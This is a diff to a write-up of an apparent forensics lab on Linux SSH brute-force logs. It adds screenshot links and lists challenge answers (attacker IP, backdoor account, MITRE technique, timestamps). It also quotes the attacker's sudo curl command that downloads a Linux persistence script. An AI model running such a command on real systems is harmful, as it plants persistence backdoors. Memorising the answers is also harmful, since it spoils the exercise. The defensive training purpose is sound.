@@ -20,7 +20,7 @@ The objective of this investigation was to analyze Linux authentication logs and
 
 **Answer:** `65.2.161.68`
 
-
+![Attacker IP](Evidence/01-Attacker-IP.png)
 
 ---
 
@@ -28,15 +28,15 @@ The objective of this investigation was to analyze Linux authentication logs and
 
 **Answer:** `root`
 
-
+![Compromised Username](Evidence/02-Compromised-Username.png)
 
 ---
 
 ### Task 3: Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time differs from the authentication time and can be found in the `wtmp` artifact.
 
-**Answer:** `2024-03-06 06:32:45 UTC`
+**Answer:** `2024-03-06 06:32:45`
 
-
+![SSH Login Timestamp](Evidence/03-SSH-Login-Timestamp.png)
 
 ---
 
@@ -44,7 +44,7 @@ The objective of this investigation was to analyze Linux authentication logs and
 
 **Answer:** `37`
 
-
+![SSH Session ID](Evidence/04-SSH-Session-ID.png)
 
 ---
 
@@ -52,7 +52,7 @@ The objective of this investigation was to analyze Linux authentication logs and
 
 **Answer:** `cyberjunkie`
 
-
+![Backdoor User Creation](Evidence/05-Backdoor-User-Creation.png)
 
 ---
 
@@ -60,11 +60,7 @@ The objective of this investigation was to analyze Linux authentication logs and
 
 **Answer:** `T1136.001`
 
-**Technique:** Create Account: Local Account
-
-**Tactic:** Persistence
-
-
+![MITRE ATT&CK](Evidence/06-MITRE-ATTACK.png)
 
 Reference: [MITRE ATT&CK T1136.001](https://attack.mitre.org/techniques/T1136/001/)
 
@@ -72,9 +68,9 @@ Reference: [MITRE ATT&CK T1136.001](https://attack.mitre.org/techniques/T1136/00
 
 ### Task 7: What time did the attacker's first SSH session end according to `auth.log`?
 
-**Answer:** `2024-03-06 06:37:24 UTC`
+**Answer:** `2024-03-06 06:37:24`
 
-
+![First SSH Session End](Evidence/07-First-SSH-Session-End.png)
 
 ---
 
@@ -86,7 +82,7 @@ Reference: [MITRE ATT&CK T1136.001](https://attack.mitre.org/techniques/T1136/00
 /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
 ```
 
-
+![Sudo Curl Command](Evidence/08-Sudo-Curl-Command.png)
 
 ---
 
